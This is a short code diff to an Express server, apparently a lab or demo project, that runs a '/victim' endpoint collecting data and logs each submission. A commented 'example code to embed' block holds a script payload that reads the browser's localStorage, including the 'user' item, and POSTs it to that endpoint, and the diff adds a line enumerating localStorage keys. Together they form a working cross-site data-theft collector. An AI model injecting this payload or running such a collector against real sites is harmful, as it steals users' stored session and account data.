@@ -20,6 +20,8 @@ app.options('*', cors())
 /*
 Eample code to embed
 
+Object.keys(localStorage)
+
 const params = {
   headers: {
     'content-type': 'application/json; charset=UTF-8'
@@ -27,7 +29,6 @@ const params = {
   body: JSON.stringify({ content: localStorage.getItem('user') }),
   method: 'POST'
 };
-
 fetch('http://127.0.0.1:3001/victim', params)
 */
 app.post('/victim', cors(), function(request, response) {
@@ -37,6 +38,7 @@ app.post('/victim', cors(), function(request, response) {
     [contentIn],
     function(err, result) {
       // response.status(201).send({ status: 'Created' });
+      console.log('NEW: ', contentIn);
       response.end();
     });
 });
